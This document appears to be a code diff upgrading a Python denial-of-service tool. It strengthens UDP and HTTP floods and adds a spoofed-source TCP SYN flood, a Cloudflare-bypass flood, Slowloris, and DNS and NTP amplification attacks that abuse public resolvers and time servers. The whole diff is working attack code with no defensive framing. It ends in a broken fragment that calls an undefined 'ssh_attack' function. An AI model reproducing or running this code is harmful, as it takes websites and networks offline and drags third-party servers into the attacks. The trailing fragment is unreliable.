@@ -4,212 +4,463 @@ import socket
 import random
 import threading
 import ssl
+import struct
+import requests
+from urllib.parse import urlparse
+import dns.resolver
+import socks
+import cloudscraper
+
+# Global variables for user-agent rotation and proxy lists
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
+]
+
+PROXY_LIST = []  # Populate with proxy servers if available
 
 def attack_udp_god(ip, port, duration):
-    """Best UDP flood attack method"""
-    import random
-    import socket
-    import threading
-    import time
+    """Enhanced UDP flood with more threads and larger packets"""
+    threads_count = 15
+    packet_size = 1450  # Maximum without fragmentation
     
-    times = 50000
-    threads_count = 5
-    choice = 'y'  # Always use UDP
-    
-    def run():
-        data = random._urandom(1024)
-        i = random.choice(("[*]","[!]","[#]"))
+    def flood():
+        data = random._urandom(packet_size)
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         end_time = time.time() + duration
         
         while time.time() < end_time:
             try:
+                s.sendto(data, (ip, port))
+                # Send additional random packets
+                for _ in range(5):
+                    if time.time() >= end_time:
+                        break
+                    s.sendto(random._urandom(packet_size), (ip, port))
+            except:
+                try:
+                    s.close()
+                except:
+                    pass
                 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                addr = (str(ip), int(port))
-                for x in range(times):
-                    if time.time() >= end_time:
-                        break
-                    s.sendto(data, addr)
-            except Exception as e:
-                pass
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     
-    def run2():
-        data = random._urandom(16)
-        i = random.choice(("[*]","[!]","[#]"))
-        end_time = time.time() + duration
-        
-        while time.time() < end_time:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((ip, port))
-                s.send(data)
-                for x in range(times):
-                    if time.time() >= end_time:
-                        break
-                    s.send(data)
-            except Exception as e:
-                s.close()
-    
+    # Start threads
     threads = []
-    for y in range(threads_count):
-        if choice == 'y':
-            th = threading.Thread(target=run)
-            th.daemon = True
-            threads.append(th)
-        else:
-            th = threading.Thread(target=run2)
-            th.daemon = True
-            threads.append(th)
+    for _ in range(threads_count):
+        t = threading.Thread(target=flood)
+        t.daemon = True
+        threads.append(t)
+        t.start()
     
-    for th in threads:
-        th.start()
-    
-    end_time = time.time() + duration
-    while time.time() < end_time and any(th.is_alive() for th in threads):
-        time.sleep(0.1)
+    # Wait for duration
+    time.sleep(duration)
+    for t in threads:
+        try:
+            t.join(0.1)
+        except:
+            pass
 
 def attack_http_flood(ip, port, duration):
-    """Advanced HTTP flood attack with multiple techniques"""
-    import socket
-    import ssl
-    import random
-    import threading
-    import time
-    import struct
-    
-    threads_count = 500
-    user_agents = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
-    ]
-    
-    paths = [
-        "/", "/wp-admin/", "/admin/", "/login/", "/api/", 
-        "/search/", "/checkout/", "/cart/", "/product/", 
-        "/user/profile/", "/ajax/", "/graphql", "/wp-json/"
-    ]
-    
-    methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS"]
-    
-    referers = [
-        "https://www.google.com/", "https://www.bing.com/", 
-        "https://yandex.com/", "https://duckduckgo.com/",
-        "https://www.facebook.com/", "https://twitter.com/",
-        "https://www.reddit.com/", "https://www.linkedin.com/"
-    ]
-    
-    accepts = [
-        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
-    ]
-    
-    languages = ["en-US,en;q=0.9", "es-ES,es;q=0.8", "fr-FR,fr;q=0.7", "de-DE,de;q=0.6"]
-    encodings = ["gzip, deflate, br", "gzip, deflate", "identity"]
-    cache_controls = ["no-cache", "max-age=0", "no-store"]
-    
+    """Enhanced HTTP flood with more sophisticated techniques"""
+    threads_count = 1000
     use_ssl = port == 443
-    request_count = [0]
     
-    def build_http_request(host):
+    # Enhanced headers and paths
+    paths = [
+        "/", "/wp-admin.php", "/admin/login", "/api/v1/users",
+        "/search", "/checkout", "/cart", "/product/123",
+        "/user/profile", "/ajax/search", "/graphql", "/wp-json/wp/v2/posts"
+    ]
+    
+    methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "TRACE", "PATCH"]
+    
+    def build_request(target_ip):
         method = random.choice(methods)
         path = random.choice(paths)
-        if random.random() < 0.3:
-            path += "?" + "&".join([f"{random.choice(['id','q','search','page','category'])}={random.randint(1,1000)}" 
-                                    for _ in range(random.randint(1,3))])
+        
         headers = [
             f"{method} {path} HTTP/1.1",
-            f"Host: {host}",
-            f"User-Agent: {random.choice(user_agents)}",
-            f"Accept: {random.choice(accepts)}",
-            f"Accept-Language: {random.choice(languages)}",
-            f"Accept-Encoding: {random.choice(encodings)}",
-            f"Cache-Control: {random.choice(cache_controls)}",
+            f"Host: {target_ip}",
+            f"User-Agent: {random.choice(USER_AGENTS)}",
+            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            f"Accept-Language: en-US,en;q=0.5",
+            f"Accept-Encoding: gzip, deflate, br",
+            f"Cache-Control: no-cache",
+            f"X-Forwarded-For: {'.'.join(str(random.randint(1, 255)) for _ in range(4))}",
+            f"X-Real-IP: {'.'.join(str(random.randint(1, 255)) for _ in range(4))}",
             f"Connection: keep-alive",
             f"Upgrade-Insecure-Requests: 1",
         ]
-        if random.random() < 0.7:
-            headers.append(f"Referer: {random.choice(referers)}")
-        if random.random() < 0.6:
-            headers.append(f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
+        
         if method == "POST":
-            headers.append("Content-Type: application/x-www-form-urlencoded")
-            content = f"data={random.randint(1000000,9999999)}"
-            headers.append(f"Content-Length: {len(content)}")
-            headers.append("")  # blank line before body
-            headers.append(content)
-        else:
-            headers.append("")
-        return "\r\n".join(headers)
+            headers.extend([
+                "Content-Type: application/x-www-form-urlencoded",
+                f"Content-Length: {random.randint(100, 2000)}"
+            ])
+        
+        return "\r\n".join(headers) + "\r\n\r\n"
     
-    def attack_thread():
+    def flood():
         end_time = time.time() + duration
+        sock = None
+        
+        while time.time() < end_time:
+            try:
+                if sock is None:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(5)
+                    
+                    if use_ssl:
+                        context = ssl.create_default_context()
+                        context.check_hostname = False
+                        context.verify_mode = ssl.CERT_NONE
+                        sock = context.wrap_socket(sock, server_hostname=ip)
+                    
+                    sock.connect((ip, port))
+                
+                request = build_request(ip)
+                sock.sendall(request.encode())
+                
+                # Keep connection alive for multiple requests
+                for _ in range(random.randint(1, 10)):
+                    if time.time() >= end_time:
+                        break
+                    request = build_request(ip)
+                    sock.sendall(request.encode())
+                    time.sleep(0.01)
+                    
+            except Exception as e:
+                try:
+                    sock.close()
+                except:
+                    pass
+                sock = None
+                time.sleep(0.1)
+    
+    # Start threads
+    threads = []
+    for _ in range(threads_count):
+        t = threading.Thread(target=flood)
+        t.daemon = True
+        threads.append(t)
+        t.start()
+    
+    # Wait for duration
+    time.sleep(duration)
+    for t in threads:
         try:
-            host = ip
-            if not all(c.isdigit() or c == '.' for c in ip):
-                host = socket.gethostbyname(ip)
-            
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(10)
+            t.join(0.1)
+        except:
+            pass
+
+def attack_tcp_syn(ip, port, duration):
+    """Powerful TCP SYN flood attack"""
+    threads_count = 10
+    
+    def syn_flood():
+        end_time = time.time() + duration
+        while time.time() < end_time:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+                
+                # Craft IP header
+                source_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
+                dest_ip = socket.inet_aton(ip)
+                
+                # IP header
+                ip_ver_ihl = 0x45
+                ip_tos = 0
+                ip_tot_len = 0
+                ip_id = random.randint(1, 65535)
+                ip_frag_off = 0
+                ip_ttl = 255
+                ip_proto = socket.IPPROTO_TCP
+                ip_check = 0
+                ip_saddr = socket.inet_aton(source_ip)
+                ip_daddr = dest_ip
+                
+                ip_header = struct.pack('!BBHHHBBH4s4s',
+                                       ip_ver_ihl, ip_tos, ip_tot_len, ip_id,
+                                       ip_frag_off, ip_ttl, ip_proto, ip_check,
+                                       ip_saddr, ip_daddr)
+                
+                # TCP header
+                source_port = random.randint(1024, 65535)
+                dest_port = port
+                seq = random.randint(0, 4294967295)
+                ack_seq = 0
+                doff = 5
+                fin, syn, rst, psh, ack, urg = 0, 1, 0, 0, 0, 0
+                tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
+                window = socket.htons(5840)
+                check = 0
+                urg_ptr = 0
+                
+                tcp_offset = (doff << 4)
+                tcp_header = struct.pack('!HHLLBBHHH',
+                                        source_port, dest_port, seq, ack_seq,
+                                        tcp_offset, tcp_flags, window, check, urg_ptr)
+                
+                # Send packet
+                s.sendto(ip_header + tcp_header, (ip, 0))
+                s.close()
+                
+            except Exception as e:
+                pass
+    
+    # Start threads
+    threads = []
+    for _ in range(threads_count):
+        t = threading.Thread(target=syn_flood)
+        t.daemon = True
+        threads.append(t)
+        t.start()
+    
+    time.sleep(duration)
+    for t in threads:
+        try:
+            t.join(0.1)
+        except:
+            pass
+
+def attack_cloudflare_bypass(url, duration):
+    """Advanced Cloudflare bypass using various techniques"""
+    threads_count = 50
+    
+    def bypass_attack():
+        end_time = time.time() + duration
+        scraper = cloudscraper.create_scraper()
+        
+        while time.time() < end_time:
+            try:
+                # Rotate user agents
+                headers = {
+                    'User-Agent': random.choice(USER_AGENTS),
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                    'Accept-Language': 'en-US,en;q=0.5',
+                    'Accept-Encoding': 'gzip, deflate, br',
+                    'Connection': 'keep-alive',
+                    'Upgrade-Insecure-Requests': '1',
+                    'Cache-Control': 'max-age=0',
+                    'TE': 'Trailers',
+                }
+                
+                # Add various headers to mimic real browser
+                if random.random() > 0.5:
+                    headers['X-Forwarded-For'] = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
+                
+                # Make request with cloudscraper to bypass basic protection
+                response = scraper.get(url, headers=headers, timeout=5)
+                
+                # If we get a challenge, try to solve it
+                if response.status_code == 403 or "cloudflare" in response.text.lower():
+                    # Additional bypass techniques
+                    time.sleep(2)  # Wait before retrying
+                    continue
+                    
+            except Exception as e:
+                pass
+    
+    # Start threads
+    threads = []
+    for _ in range(threads_count):
+        t = threading.Thread(target=bypass_attack)
+        t.daemon = True
+        threads.append(t)
+        t.start()
+    
+    time.sleep(duration)
+    for t in threads:
+        try:
+            t.join(0.1)
+        except:
+            pass
+
+def attack_slowloris(ip, port, duration):
+    """Advanced Slowloris attack with more connections"""
+    sockets_count = 500
+    sockets = []
+    use_ssl = port == 443
+    
+    # Create initial sockets
+    for _ in range(sockets_count):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(2)
             
             if use_ssl:
                 context = ssl.create_default_context()
                 context.check_hostname = False
                 context.verify_mode = ssl.CERT_NONE
-                sock = context.wrap_socket(sock, server_hostname=ip)
+                s = context.wrap_socket(s, server_hostname=ip)
             
-            sock.connect((host, port))
-            
-            while time.time() < end_time:
-                try:
-                    request = build_http_request(ip)
-                    sock.sendall(request.encode())
-                    request_count[0] += 1
-                    time.sleep(0.01)
-                except (socket.error, ssl.SSLError):
-                    try:
-                        sock.close()
-                    except:
-                        pass
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(10)
-                    if use_ssl:
-                        sock = context.wrap_socket(sock, server_hostname=ip)
-                    sock.connect((host, port))
-            
-            try:
-                sock.close()
-            except:
-                pass
-        except Exception as e:
+            s.connect((ip, port))
+            s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
+            sockets.append(s)
+        except:
             pass
     
+    end_time = time.time() + duration
+    
+    # Keep connections alive
+    while time.time() < end_time:
+        for s in sockets:
+            try:
+                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
+            except:
+                try:
+                    s.close()
+                    sockets.remove(s)
+                    # Try to create a new socket
+                    try:
+                        new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        new_s.settimeout(2)
+                        
+                        if use_ssl:
+                            context = ssl.create_default_context()
+                            context.check_hostname = False
+                            context.verify_mode = ssl.CERT_NONE
+                            new_s = context.wrap_socket(new_s, server_hostname=ip)
+                        
+                        new_s.connect((ip, port))
+                        new_s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
+                        sockets.append(new_s)
+                    except:
+                        pass
+                except:
+                    pass
+        time.sleep(15)  # Send keep-alive headers every 15 seconds
+    
+    # Clean up
+    for s in sockets:
+        try:
+            s.close()
+        except:
+            pass
+
+def attack_dns_amplification(target_ip, duration):
+    """DNS amplification attack using open resolvers"""
+    # List of common DNS servers (replace with open resolvers for better effect)
+    dns_servers = [
+        "8.8.8.8", "8.8.4.4",  # Google DNS
+        "1.1.1.1", "1.0.0.1",  # Cloudflare DNS
+        "9.9.9.9",  # Quad9
+    ]
+    
+    threads_count = 10
+    
+    def dns_flood():
+        end_time = time.time() + duration
+        while time.time() < end_time:
+            try:
+                # Create a UDP socket
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                
+                # Craft DNS query (ANY query for amplification)
+                query = b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
+                # Add a random domain to query
+                domain = f"{random.randint(1, 1000000)}.example.com"
+                for part in domain.split('.'):
+                    query += bytes([len(part)]) + part.encode()
+                
+                query += b"\x00\x00\xff\x00\x01"  # ANY query
+                
+                # Send to multiple DNS servers
+                for dns_server in dns_servers:
+                    if time.time() >= end_time:
+                        break
+                    s.sendto(query, (dns_server, 53))
+                
+                s.close()
+            except:
+                pass
+    
+    # Start threads
     threads = []
     for _ in range(threads_count):
-        thread = threading.Thread(target=attack_thread)
-        thread.daemon = True
-        threads.append(thread)
+        t = threading.Thread(target=dns_flood)
+        t.daemon = True
+        threads.append(t)
+        t.start()
     
-    for thread in threads:
-        thread.start()
-    
-    start_time = time.time()
-    last_display = start_time
-    
-    while time.time() < start_time + duration:
-        time.sleep(1)
-        current_time = time.time()
-        if current_time - last_display >= 5:
-            elapsed = current_time - start_time
-            remaining = duration - elapsed
-            rps = request_count[0] / elapsed if elapsed > 0 else 0
-            print(f"HTTP Flood: {request_count[0]:,} requests sent ({rps:,.0f} req/sec), {remaining:.1f}s remaining")
-            last_display = current_time
-    
-    for thread in threads:
+    time.sleep(duration)
+    for t in threads:
         try:
-            thread.join(1)
+            t.join(0.1)
+        except:
+            pass
+
+def attack_ntp_amplification(target_ip, duration):
+    """NTP amplification attack using MONLIST command"""
+    # List of known vulnerable NTP servers (should be updated regularly)
+    ntp_servers = []
+    
+    # Try to find NTP servers if none provided
+    if not ntp_servers:
+        try:
+            resolver = dns.resolver.Resolver()
+            answers = resolver.resolve('pool.ntp.org', 'A')
+            ntp_servers = [str(r) for r in answers]
+        except:
+            ntp_servers = ["pool.ntp.org"]
+    
+    threads_count = 5
+    
+    def ntp_flood():
+        end_time = time.time() + duration
+        # MONLIST command - triggers amplification
+        payload = b'\x17\x00\x03\x2a' + b'\x00' * 4
+        
+        while time.time() < end_time:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                
+                for ntp_server in ntp_servers:
+                    if time.time() >= end_time:
+                        break
+                    try:
+                        s.sendto(payload, (ntp_server, 123))
+                    except:
+                        pass
+                
+                s.close()
+            except:
+                pass
+    
+    # Start threads
+    threads = []
+    for _ in range(threads_count):
+        t = threading.Thread(target=ntp_flood)
+        t.daemon = True
+        threads.append(t)
+        t.start()
+    
+    time.sleep(duration)
+    for t in threads:
+        try:
+            t.join(0.1)
+        except:
+            pass
+
+    
+    # Start multiple threads
+    threads = []
+    for _ in range(10):
+        t = threading.Thread(target=ssh_attack)
+        t.daemon = True
+        threads.append(t)
+        t.start()
+    
+    time.sleep(duration)
+    for t in threads:
+        try:
+            t.join(0.1)
         except:
             pass
